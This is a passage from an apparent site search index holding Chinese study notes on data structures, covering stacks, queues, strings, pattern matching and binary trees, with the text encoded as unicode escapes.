\u200b\u5faa\u73af\u200b\u94fe\u8868","text":"<p>\u200b\u5c06\u200b\u5355\u94fe\u200b\u8868\u200b\u6216\u8005\u200b\u53cc\u94fe\u200b\u8868\u200b\u7684\u200b\u5934\u5c3e\u200b\u7ed3\u70b9\u200b\u94fe\u63a5\u200b\u8d77\u6765\u200b\uff0c\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u5faa\u73af\u200b\u94fe\u8868\u200b\u3002</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2003%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/","title":"Chapter 03 \u200b\u6808\u200b\u548c\u200b\u961f\u5217","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2003%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#1","title":"1. \u200b\u6808","text":"<p>\u200b\u540e\u8fdb\u5148\u51fa\u200b, Last-In First-Out</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2003%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#11","title":"1.1 \u200b\u987a\u5e8f\u200b\u6808","text":"<p>\u200b\u4f7f\u7528\u200b\u5411\u91cf\u200b\u5b9e\u73b0\u200b</p> <p>\u200b\u4e0a\u6ea2\u200b\uff08Overflow\uff09</p> <p>\u200b\u5f53\u6808\u200b\u4e2d\u200b\u5df2\u7ecf\u200b\u6709\u200bmaxsize\u200b\u4e2a\u200b\u5143\u7d20\u200b\u65f6\u200b\uff0c\u200b\u5982\u679c\u200b\u518d\u200b\u505a\u200b\u8fdb\u6808\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u6240\u200b\u4ea7\u751f\u200b\u7684\u200b\u201c\u200b\u65e0\u200b\u7a7a\u95f4\u200b\u53ef\u7528\u200b\u201d\u200b\u73b0\u8c61\u200b</p> <p>\u200b\u4e0b\u6ea2\u200b\uff08Underflow\uff09</p> <p>\u200b\u7a7a\u6808\u200b\u8fdb\u884c\u200b\u51fa\u6808\u200b\u6240\u200b\u4ea7\u751f\u200b\u7684\u200b\u201c\u200b\u65e0\u200b\u5143\u7d20\u200b\u53ef\u200b\u5220\u200b\u201d\u200b\u73b0\u8c61\u200b</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2003%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#12","title":"1.2 \u200b\u94fe\u5f0f\u200b\u6808","text":"<p>\u200b\u7528\u200b\u5355\u94fe\u200b\u8868\u200b\u5b9e\u73b0\u200b</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2003%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#13","title":"1.3 \u200b\u987a\u5e8f\u200b\u6808\u200b\u4e0e\u200b\u94fe\u5f0f\u200b\u6808\u200b\u7684\u200b\u6bd4\u8f83","text":"<p>\u200b\u65f6\u95f4\u200b\u6548\u7387\u200b:</p> <ul> <li>\u200b\u6240\u6709\u200b\u64cd\u4f5c\u200b\u90fd\u200b\u53ea\u200b\u9700\u200b\u5e38\u6570\u200b\u65f6\u95f4\u200b</li> <li>\u200b\u987a\u5e8f\u200b\u6808\u200b\u548c\u200b\u94fe\u5f0f\u200b\u6808\u200b\u5728\u200b\u65f6\u95f4\u200b\u6548\u7387\u200b\u4e0a\u200b\u96be\u5206\u4f2f\u4ef2\u200b</li> </ul> <p>\u200b\u7a7a\u95f4\u200b\u6548\u7387\u200b:</p> <ul> <li>\u200b\u987a\u5e8f\u200b\u6808\u987b\u200b\u8bf4\u660e\u200b\u4e00\u4e2a\u200b\u56fa\u5b9a\u200b\u7684\u200b\u957f\u5ea6\u200b</li> <li>\u200b\u94fe\u5f0f\u200b\u6808\u200b\u7684\u200b\u957f\u5ea6\u200b\u53ef\u53d8\u200b\uff0c\u200b\u4f46\u200b\u589e\u52a0\u200b\u7ed3\u6784\u6027\u200b\u5f00\u9500\u200b</li> </ul> <p>\u200b\u5b9e\u9645\u200b\u5e94\u7528\u200b\u4e2d\u200b\uff0c\u200b\u987a\u5e8f\u200b\u6808\u6bd4\u200b\u94fe\u5f0f\u200b\u6808\u7528\u200b\u5f97\u200b\u66f4\u200b\u5e7f\u6cdb\u200b\u4e9b\u200b</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2003%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#2","title":"2. \u200b\u961f\u5217","text":"<p>\u200b\u961f\u5217\u200b\u662f\u200b\u53ea\u200b\u5141\u8bb8\u200b\u5728\u200b\u4e00\u7aef\u200b\u5220\u9664\u200b\uff0c\u200b\u5728\u200b\u53e6\u4e00\u7aef\u200b\u63d2\u5165\u200b\u7684\u200b\u7ebf\u6027\u8868\u200b</p> <p>\u200b\u5141\u8bb8\u200b\u5220\u9664\u200b\u7684\u200b\u4e00\u7aef\u200b\u53eb\u505a\u200b\u961f\u5934\u200b(front)\uff0c\u200b\u5141\u8bb8\u200b\u63d2\u5165\u200b\u7684\u200b\u4e00\u7aef\u200b\u53eb\u505a\u200b\u961f\u5c3e\u200b(rear)</p> <p>\u200b\u7279\u6027\u200b: \u200b\u5148\u8fdb\u5148\u51fa\u200b(FIFO, First In First Out)</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2003%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#21","title":"2.1 \u200b\u987a\u5e8f\u200b\u961f\u5217","text":"<p>\u200b\u4f7f\u7528\u200b\u987a\u5e8f\u200b\u8868\u200b\u5b9e\u73b0\u200b</p> <p>\u200b\u7528\u200b\u5411\u91cf\u200b\u5b58\u50a8\u200b\u961f\u5217\u200b\u5143\u7d20\u200b\uff0c\u200b\u7528\u200b\u4e24\u4e2a\u200b\u53d8\u91cf\u200b\u5206\u522b\u200b\u6307\u5411\u200b\u961f\u5217\u200b\u7684\u200b\u524d\u7aef\u200b(front)\u200b\u548c\u200b\u5c3e\u7aef\u200b(rear)</p> <p>front\uff1a\u200b\u6307\u5411\u200b\u5f53\u524d\u200b\u5f85\u200b\u51fa\u961f\u200b\u7684\u200b\u5143\u7d20\u200b\u4f4d\u7f6e\u200b\uff08\u200b\u5730\u5740\u200b\uff09</p> <p>rear\uff1a \u200b\u6307\u5411\u200b\u5f53\u524d\u200b\u5f85\u200b\u5165\u961f\u200b\u7684\u200b\u5143\u7d20\u200b\u4f4d\u7f6e\u200b\uff08\u200b\u5730\u5740\u200b\uff09</p> <p></p> <p>\u200b\u4e0a\u6ea2\u200b</p> <p>\u200b\u5f53\u200b\u961f\u5217\u200b\u6ee1\u65f6\u200b\uff0c\u200b\u518d\u200b\u505a\u200b\u8fdb\u961f\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u6240\u200b\u51fa\u73b0\u200b\u7684\u200b\u73b0\u8c61\u200b</p> <p>\u200b\u4e0b\u6ea2\u200b</p> <p>\u200b\u5f53\u200b\u961f\u5217\u200b\u7a7a\u65f6\u200b\uff0c\u200b\u518d\u200b\u505a\u200b\u5220\u9664\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u6240\u200b\u51fa\u73b0\u200b\u7684\u200b\u73b0\u8c61\u200b</p> <p>\u200b\u5047\u200b\u6ea2\u51fa\u200b</p> <p>\u200b\u5f53\u200b rear = mSize-1 \u200b\u65f6\u200b\uff0c\u200b\u518d\u4f5c\u200b\u63d2\u5165\u200b\u8fd0\u7b97\u200b\u5c31\u200b\u4f1a\u200b\u4ea7\u751f\u200b\u6ea2\u51fa\u200b\uff0c\u200b\u5982\u679c\u200b\u8fd9\u65f6\u200b\u961f\u5217\u200b\u7684\u200b\u524d\u7aef\u200b\u8fd8\u6709\u200b\u8bb8\u591a\u200b\u7a7a\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u73b0\u8c61\u200b\u79f0\u4e3a\u200b\u5047\u200b\u6ea2\u51fa\u200b</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2003%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#22","title":"2.2 \u200b\u5faa\u73af\u200b\u961f\u5217","text":"<p>\u200b\u82e5\u200b\u7b80\u5355\u200b\u4f7f\u7528\u200b <code>front == rear</code> \u200b\u5224\u65ad\u200b, \u200b\u65e0\u6cd5\u200b\u533a\u5206\u200b\u961f\u7a7a\u200b\u4e0e\u200b\u961f\u6ee1\u200b\u4e24\u79cd\u200b\u72b6\u6001\u200b.</p> <p>\u200b\u89e3\u51b3\u200b\u65b9\u6cd5\u200b: \u200b\u6d6a\u8d39\u200b\u4e00\u4e2a\u200b\u5b58\u50a8\u7a7a\u95f4\u200b, \u200b\u4ee5\u200b\u533a\u522b\u200b\u961f\u7a7a\u200b\u4e0e\u200b\u961f\u6ee1\u200b. \u200b\u5373\u200b\u4f7f\u7528\u200b size+1 \u200b\u4e2a\u200b\u7a7a\u95f4\u200b, \u200b\u82e5\u200b <code>(rear+1) % maxsize == front</code> \u200b\u8bf4\u660e\u200b\u961f\u6ee1\u200b. (\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u8ba1\u6570\u5668\u200b\u6cd5\u200b, \u200b\u7edf\u8ba1\u200b\u5f53\u524d\u200b\u5165\u961f\u200b\u7684\u200b\u5143\u7d20\u200b\u4e2a\u6570\u200b)</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2003%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#23","title":"2.3 \u200b\u94fe\u5f0f\u200b\u961f\u5217","text":"<p>\u200b\u5355\u94fe\u200b\u8868\u200b\u961f\u5217\u200b\uff1a\u200b\u94fe\u63a5\u200b\u6307\u9488\u200b\u7684\u200b\u65b9\u5411\u200b\u662f\u4ece\u200b\u961f\u5934\u200b\u6307\u5411\u200b\u961f\u5c3e\u200b</p> <p>\u200b\u961f\u5934\u200b\u5728\u200b\u94fe\u5934\u200b\uff0c\u200b\u961f\u5c3e\u200b\u5728\u200b\u94fe\u5c3e\u200b</p> <p>\u200b\u94fe\u5f0f\u200b\u961f\u5217\u200b\u5728\u200b\u8fdb\u961f\u200b\u65f6\u65e0\u961f\u200b\u6ee1\u200b\u95ee\u9898\u200b\uff0c\u200b\u4f46\u200b\u6709\u200b\u961f\u7a7a\u200b\u95ee\u9898\u200b</p> <p>\u200b\u961f\u7a7a\u200b\u6761\u4ef6\u200b\uff1a front == rear ==NULL</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2004%20%E5%AD%97%E7%AC%A6%E4%B8%B2/","title":"Chapter 04 \u200b\u5b57\u7b26\u4e32","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2004%20%E5%AD%97%E7%AC%A6%E4%B8%B2/#1","title":"1. \u200b\u57fa\u672c\u6982\u5ff5","text":"<p>\u200b\u5b57\u7b26\u4e32\u200b: \u200b\u7531\u200b0\u200b\u6216\u200b\u591a\u4e2a\u200b\u5b57\u7b26\u200b\u987a\u5e8f\u6392\u5217\u200b\u6240\u200b\u7ec4\u6210\u200b\u7684\u200b\u6709\u9650\u200b\u5e8f\u5217\u200b\uff0c\u200b\u79f0\u200b\u201c\u200b\u4e32\u200b\u201d</p> <p>\u200b\u4e32\u200b\u957f\u5ea6\u200b\uff1a\u200b\u5b57\u7b26\u4e32\u200b\u6240\u200b\u5305\u542b\u200b\u7684\u200b\u5b57\u7b26\u200b\u4e2a\u6570\u200b</p> <p>\u200b\u7a7a\u4e32\u200b\uff1a\u200b\u957f\u5ea6\u200b\u4e3a\u200b\u96f6\u200b\u7684\u200b\u4e32\u200b\u201c\u201d\uff1b</p> <p>\u200b\u7a7a\u683c\u200b\u4e32\u200b\uff1a\u201c   \u201d</p> <p>\u200b\u5b57\u7b26\u4e32\u200b\u5e38\u6570\u200b\uff1a\u200b\u7528\u200b\u4e00\u5bf9\u200b\u53cc\u6487\u53f7\u200b\u201cxxxx\u201d\u200b\u4f5c\u4e3a\u200b\u5de6\u53f3\u200b\u62ec\u53f7\u200b\uff0c\u200b\u4e2d\u95f4\u200b\u5b57\u7b26\u200b\u4e2a\u6570\u200b\u6709\u9650\u200b, \u200b\u5982\u200b\u201cSUNDAY\u201d,\u201c123\u201d\uff0c\u201c\u200b\u5b57\u7b26\u4e32\u200b\u201d\u200b\u7b49\u200b.</p> <p>\u200b\u4e3a\u4e86\u200b\u5b57\u7b26\u4e32\u200b\u95f4\u200b\u6bd4\u8f83\u200b\u548c\u200b\u8fd0\u7b97\u200b\u7684\u200b\u4fbf\u5229\u200b\uff0c\u200b\u5b57\u7b26\u200b\u7f16\u7801\u200b\u8868\u200b\u4e00\u822c\u200b\u9075\u5faa\u200b\u201c\u200b\u504f\u5e8f\u200b\u7f16\u7801\u200b\u89c4\u5219\u200b\u201d\u3002</p> <p>\u200b\u5b57\u7b26\u200b\u504f\u5e8f\u200b\uff1a\u200b\u6839\u636e\u200b\u5b57\u7b26\u200b\u7684\u200b\u81ea\u7136\u200b\u542b\u4e49\u200b\uff0c\u200b\u67d0\u4e9b\u200b\u5b57\u7b26\u200b\u95f4\u200b\u4e24\u200b\u4e24\u200b\u53ef\u4ee5\u200b\u6bd4\u8f83\u200b\u6b21\u5e8f\u200b\u3002\u200b\u5927\u591a\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u662f\u200b\u5b57\u5178\u200b\u5e8f\u200b.</p> <p>\u200b\u5b50\u4e32\u200b: \u200b\u82e5\u200b \\(s_2\\) \u200b\u51fa\u73b0\u200b\u5728\u200b \\(s_1\\) \u200b\u4e2d\u200b, \u200b\u5219\u200b\u79f0\u200b \\(s_2\\) \u200b\u662f\u200b \\(s_1\\) \u200b\u7684\u200b\u5b50\u4e32\u200b, \u200b\u6216\u200b \\(s_1\\) \u200b\u5305\u542b\u200b \\(s_2\\)</p> <p>\u200b\u771f\u200b\u5b50\u4e32\u200b: \u200b\u975e\u7a7a\u4e14\u200b\u4e0d\u4e3a\u200b\u81ea\u8eab\u200b\u7684\u200b\u5b50\u4e32\u200b</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2004%20%E5%AD%97%E7%AC%A6%E4%B8%B2/#2","title":"2. \u200b\u5b57\u7b26\u4e32\u200b\u7684\u200b\u5b58\u50a8\u200b\u7ed3\u6784\u200b\u4e0e\u200b\u5b9e\u73b0","text":"<p>\u200b\u9759\u6001\u200b\u5b58\u50a8\u200b - \u200b\u987a\u5e8f\u5b58\u50a8\u200b - C++\u200b\u6807\u51c6\u200b\u4e32\u200b\u7684\u200b\u8fd0\u7b97\u200b\u5b9e\u73b0\u200b \uff08\u200b\u5373\u200bC\u200b\u98ce\u683c\u200b\u7684\u200b\u5b57\u7b26\u4e32\u200b\uff09</p> <p>\u200b\u52a8\u6001\u200b\u5b58\u50a8\u200b - String\u200b\u7c7b\u200b\u7684\u200b\u8fd0\u7b97\u200b\u5b9e\u73b0\u200b</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2004%20%E5%AD%97%E7%AC%A6%E4%B8%B2/#21","title":"2.1 \u200b\u987a\u5e8f\u5b58\u50a8","text":"<p>\u200b\u6807\u51c6\u200b\u5b57\u7b26\u4e32\u200b\uff1a\u200b\u5c06\u200bC++\u200b\u7684\u200b\u51fd\u6570\u5e93\u200b\u4f5c\u4e3a\u200b\u5b57\u7b26\u4e32\u200b\u6570\u636e\u7c7b\u578b\u200b\u7684\u200b\u65b9\u6848\u200b <p>\u200b\u91c7\u7528\u200b <code>char  S[M]</code> \u200b\u7684\u200b\u5f62\u5f0f\u200b\u5b9a\u4e49\u200b\u5b57\u7b26\u4e32\u200b\u53d8\u91cf\u200b</p> <p>M \u200b\u662f\u200b\u5e38\u91cf\u200b\uff0c\u200b\u4fdd\u6301\u200b\u4e0d\u53d8\u200b</p> <p>\u200b\u4e32\u200b\u7684\u200b\u7ed3\u675f\u200b\u6807\u8bb0\u200b\uff1a'\\0'</p> <p>\u200b\u56e0\u6b64\u200b, \u200b\u957f\u5ea6\u200b\u4e3a\u200bM\u200b\u7684\u200b\u5b57\u7b26\u4e32\u200b\u5b9e\u9645\u200b\u6700\u5927\u200b\u5bb9\u91cf\u200b\u7684\u200b\u4e3a\u200b(M-1)</p> <p>Warning</p> <p>\u200b\u5bf9\u4e8e\u200b\u4e24\u4e2a\u200b\u5b57\u7b26\u4e32\u200b <code>char s1[7]=\"hello\", char s2[3]=\"aa\"</code>. \u200b\u4e0d\u80fd\u200b\u76f4\u63a5\u200b\u6267\u884c\u200b <code>s1=s2</code> \u200b\u5c06\u200b s2 \u200b\u590d\u5236\u200b\u7ed9\u200b s1, \u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b s1, s2 \u200b\u662f\u200b\u5b57\u7b26\u200b\u6570\u7ec4\u200b\u7684\u200b\u5e38\u91cf\u200b\u6307\u9488\u200b, \u200b\u6307\u5411\u200b\u6570\u7ec4\u200b\u9996\u200b\u5730\u5740\u200b, \u200b\u4e0d\u53ef\u200b\u88ab\u200b\u66f4\u6539\u200b. \u200b\u590d\u5236\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>strcpy</code> \u200b\u51fd\u6570\u200b.</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2004%20%E5%AD%97%E7%AC%A6%E4%B8%B2/#3","title":"3. \u200b\u5b57\u7b26\u4e32\u200b\u6a21\u5f0f\u5339\u914d","text":"<p>\u200b\u7528\u200b\u7ed9\u5b9a\u200b\u7684\u200b\u6a21\u677f\u200bP\uff0c\u200b\u5728\u200b\u76ee\u6807\u200b\u5b57\u7b26\u4e32\u200bT\u200b\u4e2d\u200b\u641c\u7d22\u200b\u4e0e\u200b\u6a21\u677f\u200bP\u200b\u5168\u200b\u76f8\u540c\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5b50\u4e32\u200b\uff0c\u200b\u5e76\u200b\u8fd4\u56de\u200b P \u200b\u548c\u200b T \u200b\u5339\u914d\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u5b50\u4e32\u200b\u7684\u200b\u9996\u200b\u5b57\u7b26\u200b\u4f4d\u7f6e\u200b</p> <p>\u200b\u4e3e\u4f8b\u200b:</p> <p>T\uff1d\u201ce==asdk==nje==asdk==\u201d\uff0cP=\u201casdk\u201d</p> <p>\u200b\u8fd4\u56de\u200b1</p> <p>\u200b\u4f18\u5316\u200b\u540e\u200b\u7684\u200b next \u200b\u6570\u7ec4\u200b:</p> <p>\u200b\u672c\u8d28\u200b\u4e0a\u200b\u5c31\u662f\u200b\u5982\u679c\u200b\u5f53\u524d\u200b\u4f4d\u7f6e\u200b\u5931\u914d\u200b\u800c\u200b\u8981\u200b\u8df3\u8f6c\u200b\u5230\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u4e0e\u200b\u5f53\u524d\u200b\u4f4d\u7f6e\u200b\u76f8\u540c\u200b, \u200b\u90a3\u4e48\u200b\u5b83\u200b\u4e5f\u200b\u4e00\u5b9a\u200b\u4f1a\u200b\u5931\u914d\u200b, \u200b\u6240\u4ee5\u200b\u53ef\u4ee5\u200b\u591a\u200b\u8df3\u200b\u4e00\u6b65\u200b.</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2005%20%E4%BA%8C%E5%8F%89%E6%A0%91/","title":"Chapter 05 \u200b\u4e8c\u53c9\u6811","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2005%20%E4%BA%8C%E5%8F%89%E6%A0%91/#1","title":"1. \u200b\u6982\u5ff5","text":"<ul> <li>\u200b\u5ea6\u6570\u200b\u5373\u200b\u6709\u200b\u591a\u5c11\u200b\u4e2a\u200b\u5b69\u5b50\u200b.</li> <li>\u200b\u5c42\u6570\u200b\u4ece\u200b 0 \u200b\u5f00\u59cb\u200b.</li> </ul>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2005%20%E4%BA%8C%E5%8F%89%E6%A0%91/#11","title":"1.1 \u200b\u6ee1\u200b\u4e8c\u53c9\u6811","text":"<p>\u200b\u5982\u679c\u200b\u4e00\u68f5\u200b\u4e8c\u53c9\u6811\u200b\u6ca1\u6709\u200b 1 \u200b\u5ea6\u200b\u8282\u70b9\u200b, \u200b\u5219\u200b\u662f\u200b\u6ee1\u200b\u4e8c\u53c9\u6811\u200b.  </p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2005%20%E4%BA%8C%E5%8F%89%E6%A0%91/#12","title":"1.2 \u200b\u5b8c\u5168\u200b\u4e8c\u53c9\u6811","text":"<p>\u200b\u53ea\u6709\u200b\u6700\u200b\u4e0b\u9762\u200b\u4e00\u5c42\u200b\u6ca1\u6709\u200b\u586b\u6ee1\u200b.</p> <p>\u200b\u6700\u200b\u4e0b\u9762\u200b\u4e00\u5c42\u200b\u7684\u200b\u7ed3\u70b9\u200b\u96c6\u4e2d\u200b\u5206\u5e03\u200b\u5728\u200b\u6700\u200b\u5de6\u8fb9\u200b, \u200b\u8fde\u7eed\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u4e0a\u200b.</p> <p>\u200b\u7279\u70b9\u200b: - \u200b\u53f6\u200b\u7ed3\u70b9\u200b\u53ea\u6709\u200b\u53ef\u80fd\u200b\u5728\u200b\u6700\u200b\u4e0b\u9762\u200b\u4e24\u5c42\u200b\u51fa\u73b0\u200b - \u200b\u8def\u5f84\u200b\u957f\u5ea6\u200b\u548c\u200b\u662f\u200b\u76f8\u540c\u200b\u7ed3\u70b9\u200b\u6570\u76ee\u200b\u7684\u200b\u4e8c\u53c9\u6811\u200b\u4e2d\u200b\u6700\u5c0f\u200b\u7684\u200b</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2005%20%E4%BA%8C%E5%8F%89%E6%A0%91/#13","title":"1.3 \u200b\u6269\u5145\u200b\u4e8c\u53c9\u6811","text":"<p>\u200b\u5f53\u200b\u4e8c\u53c9\u6811\u200b\u8282\u70b9\u200b\u51fa\u73b0\u200b\u7a7a\u200b\u6307\u9488\u200b\u65f6\u200b\uff0c\u200b\u5c31\u200b\u589e\u52a0\u200b\u4e00\u4e2a\u200b\u7279\u6b8a\u200b\u7ed3\u70b9\u200b\u2014\u2014\u200b\u7a7a\u200b\u6811\u53f6\u200b</p> <p>\u200b\u5ea6\u4e3a\u200b1\u200b\u7684\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u5728\u200b\u5b83\u200b\u4e0b\u9762\u200b\u589e\u52a0\u200b1\u200b\u4e2a\u7a7a\u200b\u6811\u53f6\u200b</p> <p>\u200b\u5ea6\u4e3a\u200b0\u200b\u7684\u200b\u6811\u53f6\u200b\uff0c\u200b\u5728\u200b\u5b83\u200b\u4e0b\u9762\u200b\u589e\u52a0\u200b2\u200b\u4e2a\u7a7a\u200b\u6811\u53f6\u200b</p> <p>\u200b\u6269\u5145\u200b\u7684\u200b\u4e8c\u53c9\u6811\u200b\u662f\u200b\u6ee1\u200b\u4e8c\u53c9\u6811\u200b\uff0c\u200b\u65b0\u200b\u589e\u52a0\u200b\u7a7a\u200b\u6811\u53f6\u200b(\u200b\u5916\u90e8\u200b\u7ed3\u70b9\u200bL)\u200b\u7684\u200b\u4e2a\u6570\u200b\u7b49\u4e8e\u200b\u539f\u6765\u200b\u4e8c\u53c9\u6811\u200b\u7ed3\u70b9\u200b\u4e2a\u6570\u200b(\u200b\u5185\u90e8\u200b\u7ed3\u70b9\u200bN)\u200b\u52a0\u200b1</p> <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b L \u200b\u548c\u200b  N \u200b\u6307\u200b\u7684\u200b\u662f\u200b\u76f8\u5bf9\u200b\u6269\u5145\u200b\u540e\u200b\u7684\u200b\u4e8c\u53c9\u6811\u200b\u800c\u8a00\u200b\u7684\u200b</p> <p>\u200b\u8bc1\u660e\u200b:  \u200b\u5229\u7528\u200b \\(n_0=n_2+1\\), \u200b\u65b0\u200b\u589e\u52a0\u200b\u7684\u200b\u8282\u70b9\u200b\u6570\u4e3a\u200b \\(2n_0+n_1=n_0+n_1+n_2+1\\)</p> <p>\\(n_0=n_2+1\\) \u200b\u7684\u200b\u8bc1\u660e\u200b:</p> \\[n=n_0+n_1+n_2\\] \\[n=1+2n_2+n_1\\] <p>\u200b\u8fd9\u91cc\u200b\u7b2c\u4e00\u4e2a\u200b\u8ba1\u7b97\u200b\u65b9\u5f0f\u200b\u663e\u7136\u200b, \u200b\u7b2c\u4e8c\u4e2a\u200b\u8ba1\u7b97\u200b\u65b9\u5f0f\u200b\u662f\u200b\u5229\u7528\u200b\u8ba1\u7b97\u200b\u5b69\u5b50\u200b\u603b\u6570\u200b\u52a0\u4e0a\u200b\u6839\u200b\u8282\u70b9\u200b\u5f97\u5230\u200b. \u200b\u4e24\u200b\u5f0f\u200b\u76f8\u51cf\u200b\u5373\u5f97\u200b.</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2005%20%E4%BA%8C%E5%8F%89%E6%A0%91/#2","title":"2. \u200b\u4e8c\u53c9\u6811\u200b\u7684\u200b\u4e3b\u8981\u200b\u6027\u8d28","text":"<p> (\u200b\u5206\u652f\u200b\u7ed3\u70b9\u200b\u662f\u200b\u5ea6\u6570\u200b\u5927\u4e8e\u200b0\u200b\u7684\u200b\u8282\u70b9\u200b, \u200b\u6ee1\u200b\u4e8c\u53c9\u6811\u200b\u5ea6\u6570\u200b\u8981\u4e48\u200b\u662f\u200b0, \u200b\u8981\u4e48\u200b\u662f\u200b2) </p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2005%20%E4%BA%8C%E5%8F%89%E6%A0%91/#3","title":"3. \u200b\u4e8c\u53c9\u6811\u200b\u7684\u200b\u5468\u6e38","text":"<p>\u200b\u904d\u5386\u200b\uff08Traversal\uff09,\u200b\u4e5f\u200b\u79f0\u200b\u201c\u200b\u5468\u6e38\u200b\u201d - \u200b\u6309\u7167\u200b\u4e00\u5b9a\u200b\u7684\u200b\u6b21\u5e8f\u200b\uff08\u200b\u89c4\u5f8b\u200b\uff09\u200b\u7cfb\u7edf\u5730\u200b\u8bbf\u95ee\u200b\u4e8c\u53c9\u6811\u200b\u4e2d\u200b\u7684\u200b\u7ed3\u70b9\u200b - \u200b\u6bcf\u4e2a\u200b\u7ed3\u70b9\u200b\u90fd\u200b\u6b63\u597d\u200b\u88ab\u200b\u8bbf\u95ee\u200b(\u200b\u8f93\u51fa\u200b\uff0c\u200b\u4fee\u6539\u200b\u8282\u70b9\u200b\u4fe1\u606f\u200b\u7b49\u200b) \u200b\u4e00\u6b21\u200b</p> <p>\u200b\u4e8c\u53c9\u6811\u200b\u7684\u200b\u7ebf\u6027\u5316\u200b - \u200b\u5b9e\u8d28\u200b\u662f\u200b\u628a\u200b\u4e8c\u53c9\u6811\u200b\u7684\u200b\u7ed3\u70b9\u200b\u653e\u5165\u200b\u4e00\u4e2a\u200b\u7ebf\u6027\u200b\u5e8f\u5217\u200b\u7684\u200b\u8fc7\u7a0b\u200b - \u201c\u200b\u975e\u7ebf\u6027\u200b\u201d-&gt;\u201c\u200b\u7ebf\u6027\u200b\u201d\u200b\u7684\u200b\u8fc7\u7a0b\u200b</p> <p>\u200b\u7ebf\u6027\u5316\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u662f\u200b\u5bf9\u200b\u975e\u7ebf\u6027\u200b\u7ed3\u6784\u200b\u7684\u200b\u8bbf\u95ee\u200b\u65b9\u5f0f\u200b - \u200b\u6df1\u5ea6\u200b\u4f18\u5148\u200b\uff1a\u200b\u4e00\u68f5\u200b\u4e00\u68f5\u200b\u5b50\u6811\u200b\u7684\u200b\u7eb5\u6df1\u200b\u904d\u5386\u200b  - \u200b\u5e7f\u5ea6\u200b\u4f18\u5148\u200b\uff1a\u200b\u4e00\u5c42\u200b\u4e00\u5c42\u200b\u7684\u200b\u81ea\u5de6\u800c\u53f3\u200b\u7684\u200b\u9010\u5c42\u200b\u6a2a\u5411\u200b\u904d\u5386\u200b</p> <p>Warning</p> <p>\u200b\u5df2\u77e5\u200b\u5148\u5e8f\u200b\u5e8f\u5217\u200b\u548c\u200b\u4e2d\u5e8f\u200b\u5e8f\u5217\u200b\u53ef\u4ee5\u200b\u552f\u4e00\u200b\u786e\u5b9a\u200b\u4e00\u68f5\u200b\u4e8c\u53c9\u6811\u200b, \u200b\u5df2\u77e5\u200b\u540e\u5e8f\u200b\u5e8f\u5217\u200b\u548c\u200b\u4e2d\u5e8f\u200b\u5e8f\u5217\u200b\u53ef\u4ee5\u200b\u552f\u4e00\u200b\u786e\u5b9a\u200b\u4e00\u68f5\u200b\u4e8c\u53c9\u6811\u200b, \u200b\u4f46\u662f\u200b\u5df2\u77e5\u200b\u5148\u5e8f\u200b\u548c\u200b\u540e\u5e8f\u200b\u5e8f\u5217\u200b\u4e0d\u80fd\u200b\u552f\u4e00\u200b\u786e\u5b9a\u200b\u4e00\u68f5\u200b\u4e8c\u53c9\u6811\u200b. (\u200b\u5148\u5e8f\u200b\u548c\u200b\u540e\u5e8f\u200b\u65e0\u6cd5\u200b\u533a\u5206\u200b\u5de6\u53f3\u200b)</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2005%20%E4%BA%8C%E5%8F%89%E6%A0%91/#4","title":"4. \u200b\u975e\u200b\u9012\u5f52\u200b\u904d\u5386\u200b\u4e8c\u53c9\u6811","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2005%20%E4%BA%8C%E5%8F%89%E6%A0%91/#41","title":"4.1 \u200b\u524d\u5e8f","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2005%20%E4%BA%8C%E5%8F%89%E6%A0%91/#42","title":"4.2 